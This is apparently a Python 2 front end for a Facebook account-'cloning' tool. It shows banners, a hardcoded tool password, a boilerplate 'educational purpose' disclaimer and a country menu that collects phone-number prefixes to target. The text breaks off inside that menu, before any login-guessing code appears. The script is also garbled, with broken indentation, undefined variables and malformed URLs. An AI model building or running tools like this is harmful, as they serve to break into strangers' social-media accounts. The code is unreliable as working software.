#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Tech Qaiser
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;96m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'
R='\033[1;94m'
##### LOGO #####
logo = """
\033[1;97m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;97m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;97m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;97m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝

       \033[1;97m:▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:
      \033[1;97m▒▒▒▒▒▒▒▒█▒█▒█▒▒▒█▒█▒█▒▒▒▒▒▒▒▒▒▒::     
     \033[1;97m:▒▒▒▒▒▒███▒█▒█▒███▒█▒█▒▒▒▒▒▒▒▒▒▒:::      
    \033[1;97m::▒▒▒▒▒▒█▒▒▒█▒█▒█▒▒▒█▒█▒▒▒▒▒▒▒▒▒▒::::      
   \033[1;97m:::▒▒▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:::::         
  \033[1;91m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::   
  \033[1;92m                                                        CHECK              
  \033[1;91m:》》》\033[1;93m+923455453538\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
"""
logo2 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST 
"""
logo3 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo4 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo5 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo6 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo7 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo8 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo11 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

====================================
====================================

"""
logo12 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo13 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo14 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo15 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo16 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo17 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo18 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
CorrectUsername = "Somi"
CorrectPassword = "Awan"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m\x1b[1;91mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m \x1b[1;91mTool Password  \x1b[1;97m» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://m.facebook.comSOMIMISICAN.com')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://m.facebook.comSOMIMUSICAN.com')

##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
os.system('clear')
	print logo2
        print "\033[1;95m«-----------------\033[1;91mDisclaimer\033[1;95m---------------»"
        time.sleep(0.05)
        print "\033[1;43m       \033[1;34mThis Tool is for Educational Purpose   \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mThis presentation is for educational          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mpurposes ONLY.How you use this information    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mis your responsibility.I will not be          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mheld accountable This Tool/Channel Doesn't    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mSupport illegal activities.for any illegal    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mActivitie This Tool is for Educational Purpose\033[1;0m"
        time.sleep(0.05)
        print "\033[1;95m«-----------------\033[1;91mSOMI BRAND\033[1;95m---------------»"
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;96m Fast Cloning With out Fb ID\033[1;92m[New Update]"
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;93m2.\x1b[1;94m SOMI BRAND WhatsApp Group   "
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m Exit             "
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
        elif peak =="1":
		blackmafiax()
        elif peak =="2":
		os.system('xdg-open https://chat.whatsappSomibrand')
		login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()
     def blackmafiax():
	os.system('clear')
	print logo2
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[1]  Bangladesh\033[1;91m☆.\x1b[1;96m[14]  Australia'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[2]  USA       \033[1;91m☆.\x1b[1;96m[15]  Canda'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[3]  UK        \033[1;91m☆.\x1b[1;96m[16]  China'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[4]  India     \033[1;91m☆.\x1b[1;96m[17]  Denmark'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[5]  Brazil    \033[1;91m☆.\x1b[1;96m[18]  France'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[6]  Japan     \033[1;91m☆.\x1b[1;96m[19]  Germany'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[7]  Korea     \033[1;91m☆.\x1b[1;96m[20]  Malaysia'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[8]  Italy     \033[1;91m☆.\x1b[1;96m[21]  Sri lanka'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[9]  Spain     \033[1;91m☆.\x1b[1;96m[22]  Turkey'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[10] Poland    \033[1;91m☆.\x1b[1;96m[23]  U.A.E'
        time.sleep(0.05)
        print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[11] Pakistan  \033[1;91m☆.\x1b[1;96m[24]  Saudi Arabia'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[12] Indonasia \033[1;91m☆.\x1b[1;96m[25]  Israil'
        time.sleep(0.05)
        print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[13] Peru      \033[1;91m☆.\x1b[1;96m[26]  Iran'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;91m[0]  Back            '
        time.sleep(0.05)
	print 45*'-'
	action()


def action():
	lovehackerx = raw_input('\n\033[1;91mChoose an Option>>> \033[1;95m')
	if lovehackerx =='':
		print '[!] Fill in correctly'
		action()
	elif lovehackerx =="1":
                print (logo53)
		os.system("clear")
		print (logo27)
		print("\033[1;93m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="2":
                print (logo53)
		os.system("clear")
		print (logo28)
		print("\033[1;93m555,786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+1"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="3":
                print (logo53)
		os.system("clear")
		print (logo29)
		print("\033[1;93m715,785,765,725,745,735,737, 706, 748, 783, 739, 759, 790")
		try:
			c = raw_input(" \033[1;95mchoose code  : ")
			k="+44"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="4":
                print (logo53)
		os.system("clear")
		print (logo30)
		print("\033[1;93m905,975,755,855,954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
		try:
			c = raw_input(" \033[1;95mchoose code  : ")
			k="+91"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="5":
                print (logo53)
		os.system("clear")
		print (logo31)
		print("\033[1;93m127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+55"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="6":
                print (logo53)
		os.system("clear")
		print (logo32)
		print("\033[1;93m11, 12, 19, 16, 15, 13, 14, 18, 17")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+81"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="7":
                print (logo53)
		os.system("clear")
		print (logo33)
		print("\033[1;93m1, 2, 3, 4, 5, 6, 7, 8, 9")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+82"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="8":
                print (logo53)
		os.system("clear")
		print (logo34)
		print("\033[1;93m311,323,385,388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+39"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="9":
                print (logo53)
		os.system("clear")
		print (logo35)
		print("\033[1;93m655,755,60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+34"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="10":
                print (logo53)
		os.system("clear")
		print (logo36)
		print("\033[1;93m66, 69, 78, 79, 60, 72, 67, 53, 51")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+48"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="11":
                print (logo53)
		os.system("clear")
		print (logo37)
		print("\033[1;93m01, ~to~~, 49")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="03"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="12":
                print (logo53)
		os.system("clear")
		print (logo38)
		print("\033[1;93m81,83,85,84,89,")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="13":
                print (logo53)
		os.system("clear")
		print (logo39)
		print("\033[1;93m(leave the first four digits and the last seven digits of any phone number in this country.Write the remaining digits here.91,92,93,94,95,96,97,98,99")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+51"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="14":
                print (logo53)
		os.system("clear")
		print (logo40)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.455")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+61"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="15":
                print (logo53)
		os.system("clear")
		print (logo41)
		print("\033[1;93m(leave the first one digits and the last seven digits of any phone number in this country.Write the remaining digits here.555,")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+1"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="16":
                print (logo53)
		os.system("clear")
		print (logo42)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.1355,1555,1855,")
		try:
			c = raw_input(" \033[1;95mchoose code  : ")
			k="+86"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="17":
                print (logo53)
		os.system("clear")
		print (logo43)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.2,3,4,5,6,7,8")
		try:
			c = raw_input(" \033[1;95mchoose code  : ")
			k="+45"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="18":
                print (logo53)
		os.system("clear")
		print (logo44)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.65,70,73,74,76,77")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+33"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="19":
                print (logo53)
		os.system("clear")
		print (logo45)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.151,152,153,155,157,159,160,162,179,163,174,163")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+49"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="20":
                print (logo53)
		os.system("clear")
		print (logo46)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.11,12,13,14,15,16,17,18,19")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+60"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="21":
                print (logo53)
		os.system("clear")
		print (logo47)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.71,72,73,74,75,76,77,78")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+94"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="22":
                print (logo53)
		os.system("clear")
		print (logo48)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.55,54,53,52,50")
